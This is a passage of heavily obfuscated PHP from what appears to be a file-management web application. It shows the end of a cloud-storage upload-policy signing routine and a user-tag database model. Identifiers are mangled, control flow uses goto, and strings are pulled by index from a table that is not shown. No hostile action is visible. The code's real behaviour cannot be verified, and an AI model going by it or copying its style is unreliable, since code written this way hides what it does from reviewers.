$b‘åÛƒ’áµ[43], $b‘åÛƒ’áµ[1215] => $Eº…Š¦‚¼, $b‘åÛƒ’áµ[1219] => $E¶ï„•¶Û¯, $b‘åÛƒ’áµ[1223] => $e›ê¤¿ø½„, $b‘åÛƒ’áµ[1259] => $e¶‡ÌçÌª, $b‘åÛƒ’áµ[1260] => $bç”Áéé, $b‘åÛƒ’áµ[1261] => $F¤Ÿî¯‰¾, $b‘åÛƒ’áµ[1262] => $c÷…šëÚ±Ó, $b‘åÛƒ’áµ[1263] => $aìíçƒµœ¨, $b‘åÛƒ’áµ[185] => $this->getHost()); return $c°…¿¦¿ö; goto b©ñƒ‡³ÉÜ; DÕ¡…ƒ†ÖÓ: $FÊ¸Ïì± = array($this->accessKey, $Bœè÷¦„íö, $this->region, $CñõÙö†Ï‰, $A¬ÁĞ•¢Â…); $e¶‡ÌçÌª = implode($b‘åÛƒ’áµ[8], $FÊ¸Ïì±); $bÉ¥ò†¥» = array($b‘åÛƒ’áµ[1213] => gmdate($b‘åÛƒ’áµ[1212], strtotime($b‘åÛƒ’áµ[1249])), $b‘åÛƒ’áµ[1214] => array(array($b‘åÛƒ’áµ[1216] => $this->bucket), array($b‘åÛƒ’áµ[1215] => $Eº…Š¦‚¼), array($b‘åÛƒ’áµ[1217], $b‘åÛƒ’áµ[1218], $b‘åÛƒ’áµ[43]), array($b‘åÛƒ’áµ[1217], $b‘åÛƒ’áµ[1250], $b‘åÛƒ’áµ[43]), array($b‘åÛƒ’áµ[1217], $b‘åÛƒ’áµ[1251], $b‘åÛƒ’áµ[43]), array($b‘åÛƒ’áµ[1219] => $E¶ï„•¶Û¯), array($b‘åÛƒ’áµ[1252] => $e¶‡ÌçÌª), array($b‘åÛƒ’áµ[1253] => $bç”Áéé), array($b‘åÛƒ’áµ[1254] => $F¤Ÿî¯‰¾), array($b‘åÛƒ’áµ[1255] => $c÷…šëÚ±Ó))); goto F×µ³áË˜; b©ñƒ‡³ÉÜ: } } goto Aí‰´Íó™; bòÅÊÂãĞª: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\x65\162\x5f\x66\141\166"; protected function cacheFunctionAlias($D©æØÜ¿ô„) { $C†»Á³»ƒ¶ =& $_SERVER[œÕÊİğö]; return array($C†»Á³»ƒ¶[1827] => array(USER_ID, $C†»Á³»ƒ¶[1828])); } protected function listData() { $BöÚ«áŒ =& $_SERVER[œÕÊİğö]; $A¶Ã‚”¢Àî = array($BöÚ«áŒ[1542] => USER_ID, $BöÚ«áŒ[486] => array($BöÚ«áŒ[1831], 0)); $fÃÉ¤Ëå’ª = $BöÚ«áŒ[1833]; $cˆ»ƒì¦õ„ = $this->field($fÃÉ¤Ëå’ª)->where($A¶Ã‚”¢Àî)->order($BöÚ«áŒ[1834])->select(); return $cˆ»ƒì¦õ„ ? $cˆ»ƒì¦õ„ : array(); } protected function listByTag($eõ‹—ˆâ¥) { } protected function addToTag($eÀÉãÍ„ùÑ, $CÍ´¿éƒŸå) { $Dï§ĞÀ£Ò‹ =& $_SERVER[œÕÊİğö]; if (!Model($Dï§ĞÀ£Ò‹[1967])->listData($CÍ´¿éƒŸå) || !Model($Dï§ĞÀ£Ò‹[822])->pathInfo($eÀÉãÍ„ùÑ)) { return !1; } $Bœøš†Ü´ = array($Dï§ĞÀ£Ò‹[1542] => USER_ID, $Dï§ĞÀ£Ò‹[486] => $CÍ´¿éƒŸå, $Dï§ĞÀ£Ò‹[425] => $eÀÉãÍ„ùÑ, $Dï§ĞÀ£Ò‹[426] => $Dï§ĞÀ£Ò‹[420], $Dï§ĞÀ£Ò‹[424] => $Dï§ĞÀ£Ò‹[43], $Dï§ĞÀ£Ò‹[1724] => 0); if ($this->where($Bœøš†Ü´)->find()) { return !1; } return $this->add($Bœøš†Ü´); } protected function removeFromTag($CšàÑËÅ˜„, $dÎ‘Ñõª‘) { $bÌ¢ò­ôÃ =& $_SERVER[œÕÊİğö]; if (!Model($bÌ¢ò­ôÃ[1967])->listData($dÎ‘Ñõª‘)) { return !1; } if (is_array($CšàÑËÅ˜„)) { $CšàÑËÅ˜„ = array($bÌ¢ò­ôÃ[7], $CšàÑËÅ˜„); } $eéá³Ç½« = array($bÌ¢ò­ôÃ[1542] => USER_ID, $bÌ¢ò­ôÃ[486] => $dÎ‘Ñõª‘, $bÌ¢ò­ôÃ[426] => $bÌ¢ò­ôÃ[420], $bÌ¢ò­ôÃ[425] => $CšàÑËÅ˜„); return $this->where($eéá³Ç½«)->delete(); } protected function removeByTag($f÷¸¤µ°Ñ) { $AâËÀÆŞï„ =& $_SERVER[œÕÊİğö]; if (!$f÷¸¤µ°Ñ) { return !1; } $dåĞäµ÷ÎÀ = array($AâËÀÆŞï„[1542] => USER_ID, $AâËÀÆŞï„[486] => $f÷¸¤µ°Ñ); return $this->where($dåĞäµ÷ÎÀ)->delete(); } protected function removeBySource($dÌ«‘‘¨²²) { $aÙœù‡Â«Á =& $_SERVER[œÕÊİğö]; if (is_array($dÌ«‘‘¨²²)) { $dÌ«‘‘¨²² = array($aÙœù‡Â«Á[7], $dÌ«‘‘¨²²); } $cäÒíğ‰£Ñ = array($aÙœù‡Â«Á[1542] => USER_ID, $aÙœù‡Â«Á[425] => $dÌ«‘‘¨²², $aÙœù‡Â«Á[486] => array($aÙœù‡Â«Á[995], 0)); return $this->where($cäÒíğ‰£Ñ)->delete(); } }